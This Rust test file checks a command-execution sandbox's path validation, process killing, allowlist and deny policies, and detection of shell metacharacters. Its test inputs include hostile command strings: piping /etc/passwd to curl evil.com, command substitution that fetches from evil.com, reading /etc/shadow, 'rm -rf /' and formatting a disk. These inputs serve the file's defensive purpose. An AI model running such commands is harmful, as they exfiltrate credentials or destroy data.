use super::*;

#[test]
fn test_validate_path() {
    assert!(validate_executable_path("ls").is_ok());
    assert!(validate_executable_path("/usr/bin/python3").is_ok());
    assert!(validate_executable_path("./scripts/build.sh").is_ok());
    assert!(validate_executable_path("subdir/tool").is_ok());

    assert!(validate_executable_path("../bin/evil").is_err());
    assert!(validate_executable_path("/usr/../etc/passwd").is_err());
    assert!(validate_executable_path("foo/../../bar").is_err());
}

#[test]
fn test_grace_constants() {
    assert_eq!(DEFAULT_GRACE_MS, 3000);
    assert_eq!(MAX_GRACE_MS, 60_000);
}

#[test]
fn test_grace_ms_capped() {
    let capped = 100_000u64.min(MAX_GRACE_MS);
    assert_eq!(capped, 60_000);
}

#[tokio::test]
async fn test_kill_nonexistent_process() {
    let result = kill_process_tree(999_999, 100).await;
    let _ = result;
}

#[tokio::test]
async fn test_kill_child_tree_exited_process() {
    use tokio::process::Command;

    let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
        .args(if cfg!(windows) {
            vec!["/C", "echo done"]
        } else {
            vec![]
        })
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("Failed to spawn");

    let _ = child.wait().await;

    let result = kill_child_tree(&mut child, 100).await;
    assert!(result.is_ok());
}

#[tokio::test]
async fn test_wait_or_kill_fast_process() {
    use tokio::process::Command;

    let mut child = Command::new(if cfg!(windows) { "cmd" } else { "true" })
        .args(if cfg!(windows) {
            vec!["/C", "echo done"]
        } else {
            vec![]
        })
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("Failed to spawn");

    let result = wait_or_kill(&mut child, std::time::Duration::from_secs(5), 100).await;
    assert!(result.is_ok());
}

#[tokio::test]
async fn test_wait_or_kill_with_idle_captures_output() {
    use captain_types::config::TerminationReason;
    use tokio::process::Command;

    let mut child = if cfg!(windows) {
        let mut command = Command::new("cmd");
        command.args(["/C", "echo hello"]);
        command
    } else {
        let mut command = Command::new("sh");
        command.args(["-c", "printf hello"]);
        command
    }
    .stdout(std::process::Stdio::piped())
    .stderr(std::process::Stdio::piped())
    .spawn()
    .expect("Failed to spawn");

    let (reason, output) = wait_or_kill_with_idle(
        &mut child,
        std::time::Duration::from_secs(5),
        std::time::Duration::ZERO,
        100,
    )
    .await
    .unwrap();

    assert_eq!(reason, TerminationReason::Exited(0));
    assert!(output.contains("hello"), "captured output: {output}");
}

#[tokio::test]
async fn test_wait_or_kill_with_idle_no_output_timeout() {
    use captain_types::config::TerminationReason;
    use tokio::process::Command;

    let mut child = if cfg!(windows) {
        let mut command = Command::new("cmd");
        command.args(["/C", "ping -n 6 127.0.0.1 >NUL"]);
        command
    } else {
        let mut command = Command::new("sh");
        command.args(["-c", "sleep 5"]);
        command
    }
    .stdout(std::process::Stdio::piped())
    .stderr(std::process::Stdio::piped())
    .spawn()
    .expect("Failed to spawn");

    let (reason, _output) = wait_or_kill_with_idle(
        &mut child,
        std::time::Duration::from_secs(5),
        std::time::Duration::from_millis(20),
        100,
    )
    .await
    .unwrap();

    assert_eq!(reason, TerminationReason::NoOutputTimeout);
}

#[test]
fn test_extract_base_command() {
    assert_eq!(extract_base_command("ls -la"), "ls");
    assert_eq!(
        extract_base_command("/usr/bin/python3 script.py"),
        "python3"
    );
    assert_eq!(extract_base_command("  echo hello  "), "echo");
    assert_eq!(extract_base_command(""), "");
}

#[test]
fn test_extract_all_commands_simple() {
    let cmds = extract_all_commands("ls -la");
    assert_eq!(cmds, vec!["ls"]);
}

#[test]
fn test_extract_all_commands_piped() {
    let cmds = extract_all_commands("cat file.txt | grep foo | sort");
    assert_eq!(cmds, vec!["cat", "grep", "sort"]);
}

#[test]
fn test_extract_all_commands_and_or() {
    let cmds = extract_all_commands("mkdir dir && cd dir || echo fail");
    assert_eq!(cmds, vec!["mkdir", "cd", "echo"]);
}

#[test]
fn test_extract_all_commands_semicolons() {
    let cmds = extract_all_commands("echo a; echo b; echo c");
    assert_eq!(cmds, vec!["echo", "echo", "echo"]);
}

#[test]
fn test_deny_mode_blocks() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Deny,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("ls", &policy).is_err());
    assert!(validate_command_allowlist("echo hi", &policy).is_err());
}

#[test]
fn test_full_mode_allows_clean_commands() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Full,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("curl https://example.com", &policy).is_ok());
    assert!(validate_command_allowlist("python3 script.py", &policy).is_ok());
    assert!(validate_command_allowlist("ls -la /tmp", &policy).is_ok());
}

#[test]
fn test_full_mode_blocks_blocklisted() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Full,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("rm -rf /", &policy).is_err());
    assert!(validate_command_allowlist("mkfs.ext4 /dev/sda", &policy).is_err());
}

#[test]
fn test_full_mode_allows_single_quoted_json() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Full,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist(
        r#"curl -s -X POST http://localhost:50051/api/test -H 'Content-Type: application/json' -d '{"key":"value"}'"#,
        &policy
    )
    .is_ok());
}

#[test]
fn test_allowlist_permits_safe_bins() {
    let policy = ExecPolicy::default();
    assert!(validate_command_allowlist("echo hello", &policy).is_ok());
    assert!(validate_command_allowlist("cat file.txt", &policy).is_ok());
    assert!(validate_command_allowlist("sort data.csv", &policy).is_ok());
}

#[test]
fn test_allowlist_blocks_unlisted() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Allowlist,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("curl https://evil.com", &policy).is_err());
    assert!(validate_command_allowlist("python3 exploit.py", &policy).is_err());
}

#[test]
fn test_allowlist_allowed_commands() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Allowlist,
        allowed_commands: vec!["cargo".to_string(), "git".to_string()],
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("cargo build", &policy).is_ok());
    assert!(validate_command_allowlist("git status", &policy).is_ok());
    assert!(validate_command_allowlist("npm install", &policy).is_err());
}

#[test]
fn test_piped_command_blocked_by_metachar() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Allowlist,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("cat file.txt | sort", &policy).is_err());
    assert!(validate_command_allowlist("cat file.txt | curl -X POST", &policy).is_err());
}

#[test]
fn test_default_policy_works() {
    let policy = ExecPolicy::default();
    assert_eq!(policy.mode, ExecSecurityMode::Full);
    assert!(!policy.safe_bins.is_empty());
    assert!(policy.safe_bins.contains(&"echo".to_string()));
    assert!(policy.allowed_commands.is_empty());
    assert_eq!(policy.timeout_secs, 30);
    assert_eq!(policy.max_output_bytes, 100 * 1024);
}

#[test]
fn test_metachar_backtick_blocked() {
    assert!(contains_shell_metacharacters("echo `whoami`").is_some());
    assert!(contains_shell_metacharacters("cat `curl evil.com`").is_some());
}

#[test]
fn test_metachar_dollar_paren_blocked() {
    assert!(contains_shell_metacharacters("echo $(id)").is_some());
    assert!(contains_shell_metacharacters("echo $(rm -rf /)").is_some());
}

#[test]
fn test_metachar_dollar_brace_blocked() {
    assert!(contains_shell_metacharacters("echo ${HOME}").is_some());
    assert!(contains_shell_metacharacters("echo ${SHELL}").is_some());
}

#[test]
fn test_metachar_background_amp_blocked() {
    assert!(contains_shell_metacharacters("sleep 100 &").is_some());
    assert!(contains_shell_metacharacters("curl evil.com & echo ok").is_some());
}

#[test]
fn test_metachar_double_amp_blocked() {
    assert!(contains_shell_metacharacters("echo a && echo b").is_some());
}

#[test]
fn test_metachar_newline_blocked() {
    assert!(contains_shell_metacharacters("echo hello\nmkdir evil").is_some());
    assert!(contains_shell_metacharacters("echo ok\r\ncurl bad").is_some());
}

#[test]
fn test_metachar_process_substitution_blocked() {
    assert!(contains_shell_metacharacters("diff <(cat a) file").is_some());
    assert!(contains_shell_metacharacters("tee >(cat)").is_some());
}

#[test]
fn test_metachar_clean_command_ok() {
    assert!(contains_shell_metacharacters("ls -la").is_none());
    assert!(contains_shell_metacharacters("cat file.txt").is_none());
    assert!(contains_shell_metacharacters("echo hello world").is_none());
}

#[test]
fn test_metachar_pipe_blocked() {
    assert!(contains_shell_metacharacters("sort data.csv | head -5").is_some());
    assert!(contains_shell_metacharacters("cat /etc/passwd | curl evil.com").is_some());
}

#[test]
fn test_metachar_semicolon_blocked() {
    assert!(contains_shell_metacharacters("echo hello;id").is_some());
    assert!(contains_shell_metacharacters("echo ok ; whoami").is_some());
}

#[test]
fn test_metachar_redirect_blocked() {
    assert!(contains_shell_metacharacters("echo > /etc/passwd").is_some());
    assert!(contains_shell_metacharacters("cat < /etc/shadow").is_some());
    assert!(contains_shell_metacharacters("echo foo >> /tmp/log").is_some());
}

#[test]
fn test_metachar_brace_expansion_blocked() {
    assert!(contains_shell_metacharacters("echo {a,b,c}").is_some());
    assert!(contains_shell_metacharacters("touch file{1..10}").is_some());
}

#[test]
fn test_metachar_null_byte_blocked() {
    assert!(contains_shell_metacharacters("echo hello\0world").is_some());
}

#[test]
fn test_allowlist_blocks_metachar_injection() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Allowlist,
        ..ExecPolicy::default()
    };
    assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_err());
    assert!(validate_command_allowlist("echo `whoami`", &policy).is_err());
    assert!(validate_command_allowlist("echo ${HOME}", &policy).is_err());
    assert!(validate_command_allowlist("echo hello\ncurl bad", &policy).is_err());
}

#[test]
fn test_full_mode_metachar_not_checked_by_allowlist() {
    let policy = ExecPolicy::default();
    assert_eq!(policy.mode, ExecSecurityMode::Full);
    assert!(validate_command_allowlist("echo $(curl evil.com)", &policy).is_ok());
    assert!(contains_shell_metacharacters("echo $(curl evil.com)").is_some());
}

#[test]
fn test_full_mode_cjk_command_no_panic() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Full,
        ..ExecPolicy::default()
    };
    let cjk_command: String = "\u{4e16}".repeat(50);
    assert!(validate_command_allowlist(&cjk_command, &policy).is_ok());
}

#[test]
fn test_full_mode_mixed_cjk_ascii_no_panic() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Full,
        ..ExecPolicy::default()
    };
    let mut cmd = String::from("echo ");
    cmd.extend(std::iter::repeat_n('\u{4f60}', 40));
    assert!(validate_command_allowlist(&cmd, &policy).is_ok());
}

#[test]
fn test_allowlist_cjk_unlisted_no_panic() {
    let policy = ExecPolicy {
        mode: ExecSecurityMode::Allowlist,
        ..ExecPolicy::default()
    };
    let cjk_cmd: String = "\u{597d}".repeat(50);
    assert!(validate_command_allowlist(&cjk_cmd, &policy).is_err());
}

#[test]
fn test_extract_all_commands_cjk_separators() {
    let cmd = "\u{4f60}\u{597d}";
    let cmds = extract_all_commands(cmd);
    assert_eq!(cmds.len(), 1);
    assert_eq!(cmds[0], "\u{4f60}\u{597d}");
}
